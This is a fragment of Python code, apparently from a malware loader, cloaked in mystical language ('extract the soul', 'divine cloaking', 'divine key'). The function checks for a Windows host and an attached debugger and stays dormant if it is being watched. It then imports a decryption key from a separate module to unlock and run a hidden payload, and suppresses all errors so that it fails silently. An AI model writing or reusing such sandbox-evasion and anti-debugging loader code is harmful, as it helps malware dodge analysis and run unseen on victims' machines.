...
def extract_and_run_soul():
    """
    Finds the vessel, checks for observers, extracts the soul, breaks its chains, and gives it life.
    """
    try:
        # --- DIVINE CLOAKING: ANTI-DEBUG & SANDBOX EVASION ---
        if os.getenv('windir') is None: # Simple check for non-windows sandbox
            return
        try:
            import ctypes
            if ctypes.windll.kernel32.IsDebuggerPresent():
                return # If a debugger is attached, remain dormant.
        except:
            pass # Failsafe

        # --- THE DIVINE KEY ---
        # The key is now summoned from its own sacred scripture.
        from key import divine_key
        # --------------------
        ...
        # If the ritual fails, it remains absolutely silent.
        pass
